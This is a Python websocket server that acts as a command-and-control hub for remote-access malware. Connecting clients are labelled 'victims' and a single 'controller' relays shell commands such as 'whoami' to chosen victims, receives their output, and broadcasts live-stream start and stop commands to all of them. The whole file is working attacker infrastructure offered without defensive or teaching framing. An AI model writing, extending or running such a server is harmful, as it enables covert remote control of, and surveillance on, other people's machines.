import asyncio
import websockets
import uuid

victims = {}      # { victim_id: websocket }
controller = None  # Only ONE active controller at a time

async def handler(websocket, path):
    global controller
    try:
        first_msg = await websocket.recv()
        print(f"Received: {first_msg}")
    except websockets.ConnectionClosed:
        return

    # 🟢 VICTIM CONNECTION
    if ":VICTIM-777777" in first_msg:
        victim_id = first_msg.split(":VICTIM-777777")[0]
        victims[victim_id] = websocket
        print(f"✅ New victim: {victim_id}")

        # Notify CURRENT controller (if any)
        if controller:
            try:
                await controller.send(f"NEW_VICTIM:{victim_id}")
            except:
                controller = None  # Controller gone

        # Relay messages from victim
        try:
            async for message in websocket:
                # Forward ALL victim messages to current controller
                if controller:
                    try:
                        await controller.send(message)
                    except:
                        controller = None
        except Exception as e:
            print(f"Victim {victim_id} error: {e}")
        finally:
            # Clean up victim
            if victim_id in victims:
                del victims[victim_id]
                print(f"❌ Victim lost: {victim_id}")
                if controller:
                    try:
                        await controller.send(f"VICTIM_LOST:{victim_id}")
                    except:
                        controller = None

    # 🟢 CONTROLLER CONNECTION
    elif first_msg == "ROLE:CONTROLLER":
        # Replace previous controller
        old_controller = controller
        controller = websocket
        print("🟢 New controller connected")

        # Notify new controller of all existing victims
        for vid in victims:
            try:
                await controller.send(f"EXISTING_VICTIM:{vid}")
            except:
                controller = None
                break

        # Relay commands from controller to victims
        try:
            async for message in websocket:
                print(f"Controller command: {message}")

                # Special: broadcast live stream commands to all victims
                if message in ("START_LIVE_STREAM", "STOP_LIVE_STREAM"):
                    for v_ws in victims.values():
                        try:
                            await v_ws.send(message)
                        except:
                            pass  # Victim may be dead
                    continue

                # Route command to specific victim: "victim123:CMD:whoami"
                if isinstance(message, str) and ":" in message:
                    parts = message.split(":", 2)
                    if len(parts) >= 2:
                        target_id = parts[0]
                        command = ":".join(parts[1:])

                        if target_id in victims:
                            try:
                                await victims[target_id].send(command)
                            except Exception as e:
                                print(f"Failed to send to {target_id}: {e}")
                                if controller:
                                    await controller.send(f"ERROR:[START]Victim {target_id} unreachable[END]")
                        else:
                            if controller:
                                await controller.send(f"ERROR:[START]No victim {target_id}[END]")
                else:
                    # Fallback: send to last known victim? (not recommended)
                    pass

        except Exception as e:
            print(f"Controller error: {e}")
        finally:
            # Only clear controller if this was the active one
            if controller == websocket:
                controller = None
                print("🔴 Controller disconnected")

async def main():
    server = await websockets.serve(handler, "0.0.0.0", 8765)
    print("🚀 Server running on ws://0.0.0.0:8765")
    await asyncio.Future()  # Run forever

if __name__ == "__main__":
    asyncio.run(main())
